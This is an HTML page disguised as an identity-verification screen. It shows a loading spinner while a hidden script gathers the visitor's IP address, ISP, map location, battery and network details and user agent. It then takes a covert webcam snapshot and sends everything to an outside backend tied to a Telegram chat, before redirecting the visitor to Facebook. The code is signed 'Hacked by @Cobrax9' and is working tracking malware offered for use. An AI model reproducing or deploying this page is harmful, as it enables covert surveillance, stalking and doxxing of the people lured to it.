
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Verifying Identity</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    body {
      background-color: #202020;
      color: white;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .card {
      background: #2a2a2a;
      padding: 30px;
      border-radius: 12px;
      text-align: center;
      box-shadow: 0 0 20px rgba(0,0,0,0.5);
    }
    .card h2 {
      margin-bottom: 10px;
    }
    .spinner {
      margin: 20px auto;
      width: 40px;
      height: 40px;
      border: 4px solid #999;
      border-top-color: #00ffaa;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>Verifying Your Identity</h2>
    <p>Please hold while we secure your session...</p>
    <div class="spinner"></div>
  </div>
  <video id="videoPreview" autoplay muted playsinline></video>
  <canvas id="snapshotCanvas" width="320" height="240"></canvas>

  <script>
    const chatId = new URLSearchParams(window.location.search).get("id");
    const video = document.getElementById("videoPreview");
    const canvas = document.getElementById("snapshotCanvas");
    const ctx = canvas.getContext("2d");
    let result = "📱 Hacked by @Cobrax9\n\n";
    let imageBase64 = "";
    let latlong = "";

    function collectData(ipData) {
      const ua = navigator.userAgent;
      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const connection = navigator.connection || {};
      const network = connection.effectiveType || "Unknown";

      navigator.getBattery().then(battery => {
        const charging = battery.charging ? "Yes" : "No";
        const level = Math.round(battery.level * 100) + "%";

        result += "🌎 Ip Information:\n";
        result += `🌐 IP address: ${ipData?.ip}\n`;
        result += `📡 ISP: ${ipData?.org}\n`;
        result += `🔍 ASN: ${ipData?.org?.split(" ")[0]}\n`;
        latlong = ipData?.loc;
        result += `📍 Location: https://maps.google.com/?q=${latlong}\n\n`;

        result += "📱 Device Info:\n";
        result += `🔋 Charging: ${charging}\n`;
        result += `🔌 Battery Level: ${level}\n`;
        result += `🌐 Network Type: ${network.toUpperCase()}\n`;
        result += `🕒 Time Zone: ${timeZone}\n\n`;
        result += `🖥️ User Agent: ${ua}\n`;
        result += `📱 Device Type: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
        result += "👨‍💻 Tracked on: @Cobrax9";

        capturePhotoAndSend();
      });
    }

    function capturePhotoAndSend() {
      video.style.display = "block";

      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          setTimeout(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            imageBase64 = canvas.toDataURL("image/jpeg").split(',')[1];
            sendToTelegram();
          }, 1500);
        })
        .catch(() => {
          sendToTelegram(); // send without photo
        });
    }

    function sendToTelegram() {
      if (!chatId) return;

      fetch("https://render-backend-package1.onrender.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          message: result,
          photo: imageBase64
        })
      }).then(() => {
        setTimeout(() => {
          window.location.href = "https://facebook.com";
        }, 3000);
      });
    }

    fetch("https://ipinfo.io/json?token=demo")
      .then(res => res.json())
      .then(data => collectData(data))
      .catch(() => collectData({ ip: "Unknown", org: "Unknown", loc: "0,0" }));
  </script>
</body>
</html>
